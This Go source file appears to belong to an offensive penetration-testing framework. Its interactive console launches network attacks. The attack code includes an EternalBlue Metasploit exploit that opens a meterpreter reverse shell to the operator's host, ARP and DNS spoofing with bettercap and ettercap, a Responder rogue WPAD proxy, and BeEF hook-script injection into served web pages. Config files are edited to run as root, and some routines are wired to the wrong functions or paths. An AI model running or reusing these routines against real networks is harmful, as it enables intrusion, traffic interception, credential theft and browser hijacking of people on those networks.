package internals

import(
    "os"
    "fmt"
    "time"
    "bufio"
    "utils"
    "menus"
    "banners"
    "strings"
    "os/exec"
    "bcolors"
    "subprocess"
)

var(
    FakeDns = "*"
    Target  = "default"
    Iface   = "eth0"

    Lhost, _ = utils.GetDefaultIP()
    scanner = bufio.NewScanner(os.Stdin)
    Gateway, _ = utils.GetDefaultGatewayIP()
    Name, Pass, Input, Rhost, Proxy, Module  string
    CertDir, OutPutDir, KeyPath, CertPath, ToolsDir, WordList = utils.DirLocations()
)

var defaultValues = map[string]string{
    "proxy":   "",
    "module":  "",
    "fakedns": "*",
    "target":  "default",
    "iface":   "eth0",
    "rhost":   Rhost,
    "rhosts":  Rhost,
    "lhost":   Lhost,
    "gateway": Gateway,
    "output":  OutPutDir,
}

func NetworkPentest() {
    for {
        fmt.Printf("%s%safr3%s internal(%s%s%s)%s > %s", bcolors.UNDERL, bcolors.BOLD, bcolors.ENDC, bcolors.RED, "networks_pentest.fn", bcolors.ENDC, bcolors.GREEN, bcolors.ENDC)
        scanner.Scan()
        Input = strings.TrimSpace(strings.ToLower(scanner.Text()))
        buildParts := strings.Fields(Input)
        if len(buildParts) == 0 {
            continue
        }

        if executeCommand(Input) {
            continue
        }

        switch buildParts[0] {
        case "e", "q", "exit", "quit":
            os.Exit(0)
        case "0", "b", "back":
            return
        case "set":
            handleSetCommand(buildParts)
        case "unset", "delete":
            handleUnsetCommand(buildParts)
        case "run", "start", "launch", "exploit", "execute":
            executeModule()
        default:
            utils.SystemShell(Input)
        }
    }
}

func executeCommand(cmd string) bool {
    commandMap := map[string]func(){

        "? info":           menus.HelpInfo,
        "help info":        menus.HelpInfo,

        "v":                banners.Version,
        "version":          banners.Version,

        "s":                utils.Sleep,
        "sleep":            utils.Sleep,

        "o":                utils.ListJunks,
        "junks":            utils.ListJunks,
        "outputs":          utils.ListJunks,
        "clear junks":      utils.ClearJunks,
        "clear outputs":    utils.ClearJunks,

        "logs":             subprocess.LogHistory,
        "history":          subprocess.LogHistory,
        "clear logs":       subprocess.ClearHistory,
        "clear history":    subprocess.ClearHistory,

        "? run":            menus.HelpInfoRun,
        "h run":            menus.HelpInfoRun,
        "info run":         menus.HelpInfoRun,
        "help run":         menus.HelpInfoRun,
        "? use":            menus.HelpInfoRun,
        "h use":            menus.HelpInfoRun,
        "info use":         menus.HelpInfoRun,
        "help use":         menus.HelpInfoRun,
        "? exec":           menus.HelpInfoRun,
        "h exec":           menus.HelpInfoRun,
        "info exec":        menus.HelpInfoRun,
        "help exec":        menus.HelpInfoRun,
        "? start":          menus.HelpInfoRun,
        "h start":          menus.HelpInfoRun,
        "info start":       menus.HelpInfoRun,
        "help start":       menus.HelpInfoRun,
        "? launch":         menus.HelpInfoRun,
        "h launch":         menus.HelpInfoRun,
        "info launch":      menus.HelpInfoRun,
        "help launch":      menus.HelpInfoRun,
        "? exploit":        menus.HelpInfoRun,
        "h exploit":        menus.HelpInfoRun,
        "info exploit":     menus.HelpInfoRun,
        "help exploit":     menus.HelpInfoRun,
        "? execute":        menus.HelpInfoRun,
        "h execute":        menus.HelpInfoRun,
        "info execute":     menus.HelpInfoRun,
        "help execute":     menus.HelpInfoRun,

        "set":              menus.HelpInfoSet,
        "h set":            menus.HelpInfoSet,
        "info set":         menus.HelpInfoSet,
        "help set":         menus.HelpInfoSet,

        "tips":             menus.HelpInfoTips,
        "h tips":           menus.HelpInfoTips,
        "? tips":           menus.HelpInfoTips,
        "info tips":        menus.HelpInfoTips,
        "help tips":        menus.HelpInfoTips,

        "show":             menus.HelpInfoShow,
        "? show":           menus.HelpInfoShow,
        "h show":           menus.HelpInfoShow,
        "info show":        menus.HelpInfoShow,
        "help show":        menus.HelpInfoShow,

        "info list":        menus.HelpInfoList,
        "help list":        menus.HelpInfoList,
        "use list":         menus.HelpInfoList,
        "list":             menus.HelpInfoList,

        "? options":        menus.HelpInfOptions,
        "info options":     menus.HelpInfOptions,
        "help options":     menus.HelpInfOptions,

        "banner":           banners.RandomBanners,
        "g":                utils.BrowseTutarilas,
        "t":                utils.BrowseTutarilas,
        "guide":            utils.BrowseTutarilas,
        "tutarial":         utils.BrowseTutarilas,
        "h":                menus.HelpInfoMenuZero,
        "?":                menus.HelpInfoMenuZero,
        "00":               menus.HelpInfoMenuZero,
        "help":             menus.HelpInfoMenuZero,
        "f":                menus.HelpInfoFeatures,
        "use f":            menus.HelpInfoFeatures,
        "features":         menus.HelpInfoFeatures,
        "use features":     menus.HelpInfoFeatures,

        //Chameleons//
        "info":             menus.HelpInfoMain,

        "m":                menus.MenuEight,
        "menu":             menus.MenuEight,

        "option":           menus.HelpInfOptions,
        "options":          menus.HelpInfOptions,
        "show option":      menus.HelpInfOptions,
        "show options":     menus.HelpInfOptions,

        "modules":          menus.ListMainModules,
        "show all":         menus.ListMainModules,
        "list all":         menus.ListMainModules,
        "list modules":     menus.ListMainModules,
        "show modules":     menus.ListMainModules,
    }
    if action, exists := commandMap[cmd]; exists {
        action()
        return true
    }
    return false
}

func handleSetCommand(parts []string) {
    if len(parts) < 3 {
        menus.HelpInfoSet()
        return
    }
    key, value := parts[1], parts[2]
    setValues := map[string]*string{
        "proxy": &Proxy,
        "rhost": &Rhost,
        "rhosts": &Rhost,
        "lhost": &Lhost,
        "iface": &Iface,
        "module": &Module,
        "target": &Target,
        "gateway": &Gateway,
        "fakedns": &FakeDns,
    }
    if ptr, exists := setValues[key]; exists {
        *ptr = value
        fmt.Printf("%s => %s\n", strings.ToUpper(key), value)
    } else {
        menus.HelpInfoSet()
    }
}

func handleUnsetCommand(parts []string) {
    if len(parts) < 2 {
        menus.HelpInfoSet()
        return
    }
    key := parts[1]
    unsetValues := map[string]*string{
        "proxy": &Proxy,
        "rhost": &Rhost,
        "lhost": &Lhost,
        "iface": &Iface,
        "rhosts": &Rhost,
        "module": &Module,
        "target": &Target,
        "gateway": &Gateway,
        "fakedns": &FakeDns,
    }
    if ptr, exists := unsetValues[key]; exists {
        *ptr = defaultValues[key] // Reset to default
        fmt.Printf("%s => %s\n", strings.ToUpper(key), *ptr)
    } else {
        menus.HelpInfoSet()
    }
}

func executeModule() {
    if Module == ""{
        fmt.Printf("\n%s[!] %sMissing required parameter MODULE. Use %s'help' %sfor details.\n", bcolors.RED, bcolors.ENDC, bcolors.DARKGREEN, bcolors.ENDC)
        return
    }
    if Rhost == "" {
        fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.RED, bcolors.ENDC, bcolors.DARKGREEN, bcolors.ENDC)
        return
    }
    NetworkPenModules(Module, Iface, Gateway, Lhost, Rhost, Target, FakeDns)
}

func NetworkPenModules(module string, args ...interface{}) {
    fmt.Printf("\nRHOST => %s\nMODULE => %s\n", Rhost, module)
    if Proxy != "" {
        fmt.Printf("PROXIES => %s\n", Proxy)
        utils.SetProxy(Proxy)
    }

    commands := map[string]func() {
        "portscan": func() {NaabuPortScan(Rhost)},
        "dnsrecon": func() {NmapVulnScan(Rhost)},
       "autorecon": func() {Enum4linux(Rhost)},
    }

    if action, exists := commands[module]; exists {
        action()
    } else {
        fmt.Printf("\n%s[!] %sInvalid module %s. Use %s'help' %sfor available modules.\n", bcolors.YELLOW, bcolors.ENDC, module, bcolors.DARKGREEN, bcolors.ENDC)
    }
}

func NaabuPortScan(Rhost string) {
    fmt.Printf(bcolors.GREEN + "\n[>] " + bcolors.ENDC + "port scan target: %s ...\n", Rhost + bcolors.ENDC)
    subprocess.Popen(`naabu -host %s`, Rhost)
    return
}

func NmapPortScan(Rhost string) {
    fmt.Printf(bcolors.GREEN + "\n[>] " + bcolors.ENDC + "port scan target: %s ...\n", Rhost + bcolors.ENDC)
    subprocess.Popen(`nmap -sV -sC -O -T4 -n -v -p- %s`, Rhost)
    return
}

func NmapVulnScan(Rhost string) {
    fmt.Printf(bcolors.GREEN + "\n[>] " + bcolors.ENDC + "vuln scan target: %s ...\n", Rhost + bcolors.ENDC)
    subprocess.Popen(`nmap --open -v -T4 -n -sSV -p- --script="vuln and safe" --reason %s`, Rhost)
    return
}

func SmbVulnScan(Rhost string) {
    fmt.Printf(bcolors.GREEN + "\n[>] " + bcolors.ENDC + "SMB vuln scan target: %s ...\n", Rhost + bcolors.ENDC)
    subprocess.Popen(`nmap -sV -v --script "smb-vuln*" -p139,445 %s`, Rhost)
    return
}

func Enum4linux(Rhost string) {
    fmt.Printf(bcolors.GREEN + "\n[>] " + bcolors.ENDC + "running smb recon on target: %s ...\n", Rhost + bcolors.ENDC)
    subprocess.Popen(`cd /root/.afr3/africana-base/networks/enum4linux-ng; python3 enum4linux-ng.py -A -v %s`, Rhost)
    return
}

func EnumNxc(Rhost string) {
    fmt.Printf(bcolors.GREEN + "\n[>] " + bcolors.ENDC + "running smb recon on target: %s ...\n", Rhost + bcolors.ENDC)
    subprocess.Popen(`nxc smb %s -u '' -p '' --verbose --groups --local-groups --loggedon-s --rid-brute --sessions --s --shares --pass-pol`, Rhost)
    return
}

func SmbMapScan(Rhost string) {
    fmt.Printf(bcolors.GREEN + "\n[>] " + bcolors.ENDC + "running smb recon on target: %s ...\n", Rhost + bcolors.ENDC)
    subprocess.Popen(`smbmap -u '' -p '' -r --depth 5 -H %s; smbmap --no-banner -u 'guest' -p '' -r --depth 5 -H %s`, Rhost, Rhost)
    return
}

func RpcEnumScan(Rhost string) {
    fmt.Printf(bcolors.GREEN + "\n[>] " + bcolors.ENDC + "performing rpc recon target: %s ...\n", Rhost + bcolors.ENDC)
    subprocess.Popen(`rpcclient -U "" -N %s`, Rhost)
    return
}

func SmbExploit(Rhost string, Lhost string, Lport string) {
    fmt.Printf(bcolors.GREEN + "\n[>] " + bcolors.ENDC + "exploiting smb on target: %s ...\n", Rhost + bcolors.ENDC)
    fmt.Printf("\nRHOST => %s\nLHOST => %s\nLPORT => %s\n\n", Rhost, Lhost, Lport)
    subprocess.Popen(`msfconsole -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS %s; set RPORT 445; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST %s; set LPORT %s; set VERBOSE true; exploit -j'`, Rhost, Lhost, Lport)
}

func PacketSniffer(Target string, Rhost string) {
    switch strings.ToLower(Target) {
    case "default":
        subprocess.Popen(`bettercap -caplet /usr/share/bettercap/caplets/http-req-dump/http-req-dump.cap -eval 'set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set arp.spoof.targets %s; set net.sniff.verbose true; set net.sniff.local true; net.sniff on; ticker on'`, Rhost)
    case "all":
        subprocess.Popen(`bettercap -caplet /usr/share/bettercap/caplets/http-req-dump/http-req-dump.cap -eval 'set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set net.sniff.verbose true; set net.sniff.local true; net.sniff on; active; ticker on'`)
    default:
        fmt.Printf("\n%s[!] %sInvalid TARGET %s. Use %s'help' %sfor available modules.\n", bcolors.YELLOW, bcolors.ENDC, Target, bcolors.DARKGREEN, bcolors.ENDC)
        return
    }
}

func PacketsResponder(Iface string, Lhost string) {
    filePath := "/etc/responder/Responder.conf.bak_africana"
    if _, err := os.Stat(filePath); os.IsNotExist(err) {
        subprocess.Popen(`cp /etc/responder/Responder.conf /etc/responder/Responder.conf.bak_africana`)

        newString  := fmt.Sprintf(`WPADScript = function FindProxyForURL(url, host)[if ((host == "localhost") || shExpMatch(host, "localhost.*") ||(host == "127.0.0.1") || isPlainHostName(host)) return "DIRECT"; if (dnsDomainIs(host, "ProxySrv")||shExpMatch(host, "(*.ProxySrv|ProxySrv)")) return "DIRECT"; return 'PROXY %s:3128; PROXY %s:3141; DIRECT';]'`, Lhost, Lhost)
        filesToReplacements := map[string]map[string]string{
            "/etc/responder/Responder.conf": {
            `WPADScript =`: newString,
            },
        }
        utils.Editors(filesToReplacements)

        subprocess.Popen(`responder -I %s -Pdv`, Iface)
        subprocess.Popen(`rm -rf /etc/responder/Responder.conf; mv /etc/responder/Responder.conf.bak_africana /etc/responder/Responder.conf`)

    } else {
        subprocess.Popen(`responder -I %s -Pdv`, Iface)
        subprocess.Popen(`rm -rf /etc/responder/Responder.conf; mv /etc/responder/Responder.conf.bak_africana /etc/responder/Responder.conf`)
    }
}

func BeefEttercap(Target string, Lhost string, Rhost string, Iface string, Pass string, FakeDns string, Gateway string) {
    switch strings.ToLower(Target) {
    case "default":
        filePath := "/etc/beef-xss/config.yaml.bak_africana"
        if _, err := os.Stat(filePath); os.IsNotExist(err) {
            subprocess.Popen(`cp -rf /etc/beef-xss/config.yaml /etc/beef-xss/config.yaml.bak_africana`)

            newString := fmt.Sprintf(`passwd: "%s"`, Pass)
            filesToReplacements := map[string]map[string]string{
                "/etc/beef-xss/config.yaml": {
                `passwd: "beef"`: newString,
                },
            }
            utils.Editors(filesToReplacements)
            subprocess.Popen(`chown -R beef-xss:beef-xss /usr/share/beef-xss/./config.yaml`)

            filePath := "/usr/lib/systemd/system/beef-xss.service.bak_africana"
            if _, err := os.Stat(filePath); os.IsNotExist(err) {
                subprocess.Popen(`cp -rf /usr/lib/systemd/system/beef-xss.service /usr/lib/systemd/system/beef-xss.service.bak_africana`)
                filesToReplacements := map[string]map[string]string{
                    "/usr/lib/systemd/system/beef-xss.service": {
                        `=beef-xss`: `=root`,
                    },
                }
            utils.Editors(filesToReplacements)

            }
            subprocess.Popen(`systemctl daemon-reload`)

            }

            filePathO := "/etc/ettercap/etter.conf.bak_africana"
            if _, err := os.Stat(filePathO); os.IsNotExist(err) {
                subprocess.Popen(`cp -rf /etc/ettercap/etter.conf /etc/ettercap/etter.conf.bak_africana`)
                filesToReplacements := map[string]map[string]string{
                    "/etc/ettercap/etter.conf": {
                        `ec_uid = 65534`: `ec_uid = 0`,
                        `ec_gid = 65534`: `ec_gid = 0`,
                        `#redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
                        `#redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
                        `#redir6_command_on = "ip6tables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir6_command_on = "ip6tables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
                        `#redir6_command_off = "ip6tables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir6_command_off = "ip6tables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
                    },
                }
            utils.Editors(filesToReplacements)
            }

            filePathT := "/etc/ettercap/etter.dns.bak_africana"
            if _, err := os.Stat(filePathT); os.IsNotExist(err) {
                subprocess.Popen(`cp -rf /etc/ettercap/etter.dns /etc/ettercap/etter.dns.bak_africana`)
                newString  := fmt.Sprintf("# vim:ts=8:noexpandtab\n\n%s%s%s", FakeDns, " A ", Lhost)
                filesToReplacements := map[string]map[string]string{
                    "/etc/ettercap/etter.dns": {
                        `# vim:ts=8:noexpandtab`: newString,
                     },
                }
            utils.Editors(filesToReplacements)
            }

            fileXPath := "/var/www/html/.Files"
            if _, err := os.Stat(fileXPath); os.IsNotExist(err) {
                subprocess.Popen(`mkdir -p /var/www/html/.Files/; mv /var/www/html/* /var/www/html/.Files/; cp -r /root/.afr3/africana-base/networks/beefhook/* /var/www/html/`)
                newString  := fmt.Sprintf(`<script src="http://%s:3000/hook.js"></script>`, Lhost)
                filesToReplacements := map[string]map[string]string{
                    "/var/www/html/index.html": {
                        `africana-beef`: newString,
                    },
                }
            utils.Editors(filesToReplacements)
            }

            subprocess.Popen(`systemctl restart apache2.service beef-xss.service`)
            subprocess.Popen(`systemctl -l --no-pager status apache2.service beef-xss.service`)

            fmt.Print(bcolors.BLUE + "\n[*] " + bcolors.ENDC + "Launching browser & ettercap pleas weit ...\n\n" + bcolors.ENDC)
            time.Sleep(405 * time.Millisecond)

            subprocess.Popen(`xdg-open "http://%s:3000/ui/panel" 2>/dev/null`, Lhost)
            subprocess.Popen(`ettercap -TQi %s -M arp:remote -P dns_spoof  /%s// /%s//`, Iface, Rhost, Gateway)
            subprocess.Popen(`systemctl stop apache2.service beef-xss.service`)
            subprocess.Popen(`rm -rf /var/www/html/index.html; rm -rf /var/www/html/index_files; mv /var/www/html/.Files/* /var/www/html/; rm -rf /var/www/html/.Files/; rm -rf /etc/ettercap/etter.conf; rm -rf /etc/ettercap/etter.dns; mv /etc/ettercap/etter.conf.bak_africana /etc/ettercap/etter.conf; mv /etc/ettercap/etter.dns.bak_africana /etc/ettercap/etter.dn`)
            subprocess.Popen(`systemctl -l --no-pager status apache2.service beef-xss.service`)

    case "all":
        filePath := "/etc/beef-xss/config.yaml.bak_africana"
        if _, err := os.Stat(filePath); os.IsNotExist(err) {
            subprocess.Popen(`cp -rf /etc/beef-xss/config.yaml /etc/beef-xss/config.yaml.bak_africana`)

            newString := fmt.Sprintf(`passwd: "%s"`, Pass)
            filesToReplacements := map[string]map[string]string{
                "/etc/beef-xss/config.yaml": {
                `passwd: "beef"`: newString,
                },
            }
            utils.Editors(filesToReplacements)
            subprocess.Popen(`chown -R beef-xss:beef-xss /usr/share/beef-xss/./config.yaml`)

            filePath := "/usr/lib/systemd/system/beef-xss.service.bak_africana"
            if _, err := os.Stat(filePath); os.IsNotExist(err) {
                subprocess.Popen(`cp -rf /usr/lib/systemd/system/beef-xss.service /usr/lib/systemd/system/beef-xss.service.bak_africana`)
                filesToReplacements := map[string]map[string]string{
                    "/usr/lib/systemd/system/beef-xss.service": {
                        `=beef-xss`: `=root`,
                    },
                }
            utils.Editors(filesToReplacements)
            }

            subprocess.Popen(`systemctl daemon-reload`)
            }

            filePathO := "/etc/ettercap/etter.conf.bak_africana"
            if _, err := os.Stat(filePathO); os.IsNotExist(err) {
                subprocess.Popen(`cp -rf /etc/ettercap/etter.conf /etc/ettercap/etter.conf.bak_africana`)
                filesToReplacements := map[string]map[string]string{
                    "/etc/ettercap/etter.conf": {
                        `ec_uid = 65534`: `ec_uid = 0`,
                        `ec_gid = 65534`: `ec_gid = 0`,
                        `#redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
                        `#redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
                        `#redir6_command_on = "ip6tables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir6_command_on = "ip6tables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
                        `#redir6_command_off = "ip6tables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir6_command_off = "ip6tables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
                    },
                }
            utils.Editors(filesToReplacements)
            }

            filePathT := "/etc/ettercap/etter.dns.bak_africana"
            if _, err := os.Stat(filePathT); os.IsNotExist(err) {
                subprocess.Popen(`cp -rf /etc/ettercap/etter.dns /etc/ettercap/etter.dns.bak_africana`)
                newString  := fmt.Sprintf("# vim:ts=8:noexpandtab\n\n%s%s%s", FakeDns, " A ", Lhost)
                filesToReplacements := map[string]map[string]string{
                    "/etc/ettercap/etter.dns": {
                        `# vim:ts=8:noexpandtab`: newString,
                     },
                }
            utils.Editors(filesToReplacements)
            }
            fileXPath := "/var/www/html/.Files"
            if _, err := os.Stat(fileXPath); os.IsNotExist(err) {
                subprocess.Popen(`mkdir -p /var/www/html/.Files/; mv /var/www/html/* /var/www/html/.Files/; cp -r /root/.afr3/africana-base/networks/beefhook/* /var/www/html/`)
                newString  := fmt.Sprintf(`<script src="http://%s:3000/hook.js"></script>`, Lhost)
                filesToReplacements := map[string]map[string]string{
                    "/var/www/html/index.html": {
                        `africana-beef`: newString,
                    },
                }
            utils.Editors(filesToReplacements)
            }

            subprocess.Popen(`systemctl restart apache2.service beef-xss.service`)
            subprocess.Popen(`systemctl -l --no-pager status apache2.service beef-xss.service`)

            fmt.Print(bcolors.BLUE + "\n[*] " + bcolors.ENDC + "Launching browser & ettercap pleas weit ...\n\n" + bcolors.ENDC)
            time.Sleep(405 * time.Millisecond)

            subprocess.Popen(`xdg-open "http://%s:3000/ui/panel" 2>/dev/null`, Lhost)
            subprocess.Popen(`ettercap -TQi %s -M arp:remote -P dns_spoof ///`, Iface)
            subprocess.Popen(`systemctl stop apache2.service beef-xss.service`)
            subprocess.Popen(`rm -rf /var/www/html/index.html; rm -rf /var/www/html/index_files; mv /var/www/html/.Files/* /var/www/html/; rm -rf /var/www/html/.Files/; rm -rf /etc/ettercap/etter.conf; rm -rf /etc/ettercap/etter.dns; mv /etc/ettercap/etter.conf.bak_africana /etc/ettercap/etter.conf; mv /etc/ettercap/etter.dns.bak_africana /etc/ettercap/etter.dns`)
            subprocess.Popen(`systemctl -l --no-pager status apache2.service beef-xss.service`)
    default:
        utils.SystemShell(Input)
    }
}

func BeefBettercap(Target string, Lhost string, Rhost string, Iface string, Pass string, FakeDns string, Gateway string) {
    switch strings.ToLower(Target) {
    case "default":
        filePath := "/etc/beef-xss/config.yaml.bak_africana"
        if _, err := os.Stat(filePath); os.IsNotExist(err) {
            subprocess.Popen(`cp -rf /etc/beef-xss/config.yaml /etc/beef-xss/config.yaml.bak_africana`)
            newString := fmt.Sprintf(`passwd: "%s"`, Pass)
            filesToReplacements := map[string]map[string]string{
                "/etc/beef-xss/config.yaml": {
                `passwd: "beef"`: newString,
                },
            }
            utils.Editors(filesToReplacements)
            subprocess.Popen(`chown -R beef-xss:beef-xss /usr/share/beef-xss/./config.yaml`)

            filePath := "/usr/lib/systemd/system/beef-xss.service.bak_africana"
            if _, err := os.Stat(filePath); os.IsNotExist(err) {
                subprocess.Popen(`cp -rf /usr/lib/systemd/system/beef-xss.service /usr/lib/systemd/system/beef-xss.service.bak_africana`)
                filesToReplacements := map[string]map[string]string{
                    "/usr/lib/systemd/system/beef-xss.service": {
                        `=beef-xss`: `=root`,
                    },
                }
            utils.Editors(filesToReplacements)
            }
            subprocess.Popen(`systemctl daemon-reload`)
            }

            fileXPath := "/var/www/html/.Files"
            if _, err := os.Stat(fileXPath); os.IsNotExist(err) {
                subprocess.Popen(`mkdir -p /var/www/html/.Files/; mv /var/www/html/* /var/www/html/.Files/; cp -r /root/.afr3/africana-base/networks/beefhook/* /var/www/html/`)
                newString  := fmt.Sprintf(`<script src="http://%s:3000/hook.js"></script>`, Lhost)
                filesToReplacements := map[string]map[string]string{
                    "/var/www/html/index.html": {
                        `africana-beef`: newString,
                    },
                }
            utils.Editors(filesToReplacements)
            }

            subprocess.Popen(`systemctl restart apache2.service beef-xss.service`)
            subprocess.Popen(`systemctl -l --no-pager status apache2.service beef-xss.service`)

            fmt.Print(bcolors.BLUE + "\n[*] " + bcolors.ENDC + "Launching browser & bettercap pleas weit ...\n\n" + bcolors.ENDC)
            time.Sleep(405 * time.Millisecond)
            subprocess.Popen(`xdg-open "http://%s:3000/ui/panel" 2>/dev/null`, Lhost)
            subprocess.Popen(`bettercap --iface %s -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set arp.spoof.targets %s; set dns.spoof.domains *.*; set net.sniff.verbose true; arp.spoof on; dns.spoof on; active"`, Lhost, Iface, Rhost)
            subprocess.Popen(`systemctl stop apache2.service beef-xss.service`)
            subprocess.Popen(`rm -rf /var/www/html/index.html; rm -rf /var/www/html/index_files; mv /var/www/html/.Files/* /var/www/html/; rm -rf /var/www/html/.Files/; systemctl -l --no-pager status apache2.service beef-xss.service`)
    case "all":
        if _, err := exec.LookPath("beef-xss"); err != nil {
            fmt.Printf("\n%sBeef isn't installed, install it with 'sudo apt install beef-xss'%s\n", bcolors.RED, bcolors.ENDC)
            return
        }
        filePath := "/etc/beef-xss/config.yaml.bak_africana"
        if _, err := os.Stat(filePath); os.IsNotExist(err) {
            subprocess.Popen(`cp -rf /etc/beef-xss/config.yaml /etc/beef-xss/config.yaml.bak_africana`)

            newString := fmt.Sprintf(`passwd: "%s"`, Pass)
            filesToReplacements := map[string]map[string]string{
                "/etc/beef-xss/config.yaml": {
                `passwd: "beef"`: newString,
                },
            }
            utils.Editors(filesToReplacements)
            subprocess.Popen(`chown -R beef-xss:beef-xss /usr/share/beef-xss/./config.yaml`)

            filePath := "/usr/lib/systemd/system/beef-xss.service.bak_africana"
            if _, err := os.Stat(filePath); os.IsNotExist(err) {
                subprocess.Popen(`cp -rf /usr/lib/systemd/system/beef-xss.service /usr/lib/systemd/system/beef-xss.service.bak_africana`)
                filesToReplacements := map[string]map[string]string{
                    "/usr/lib/systemd/system/beef-xss.service": {
                        `=beef-xss`: `=root`,
                    },
                }
            utils.Editors(filesToReplacements)
            }
            subprocess.Popen(`systemctl daemon-reload`)
            }

            fileXPath := "/var/www/html/.Files"
            if _, err := os.Stat(fileXPath); os.IsNotExist(err) {
                subprocess.Popen(`mkdir -p /var/www/html/.Files/; mv /var/www/html/* /var/www/html/.Files/; cp -r /root/.afr3/africana-base/networks/beefhook/* /var/www/html/`)
                newString  := fmt.Sprintf(`<script src="http://%s:3000/hook.js"></script>`, Lhost)
                filesToReplacements := map[string]map[string]string{
                    "/var/www/html/index.html": {
                        `africana-beef`: newString,
                    },
                }
            utils.Editors(filesToReplacements)
            }

            subprocess.Popen(`systemctl restart apache2.service beef-xss.service`)
            subprocess.Popen(`systemctl -l --no-pager status apache2.service beef-xss.service`)

            fmt.Print(bcolors.BLUE + "\n[*] " + bcolors.ENDC + "Launching browser & bettercap pleas weit ...\n\n" + bcolors.ENDC)
            time.Sleep(405 * time.Millisecond)

            subprocess.Popen(`xdg-open "http://%s:3000/ui/panel" 2>/dev/null`, Lhost)
            subprocess.Popen(`bettercap --iface %s -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set dns.spoof.domains *.*; set net.sniff.verbose true; set dns.spoof.all true; arp.spoof on; dns.spoof on; active"`, Iface)
            subprocess.Popen(`systemctl stop apache2.service beef-xss.service`)
            subprocess.Popen(`rm -rf /var/www/html/index.html; rm -rf /var/www/html/index_files; mv /var/www/html/.Files/* /var/www/html/; rm -rf /var/www/html/.Files/`)
            subprocess.Popen(`systemctl -l --no-pager status apache2.service beef-xss.service`)
    default:
        fmt.Printf("\n%s[!] %sInvalid TARGET %s. Use %s'help' %sfor available modules.\n", bcolors.YELLOW, bcolors.ENDC, Target, bcolors.DARKGREEN, bcolors.ENDC)
    }
}

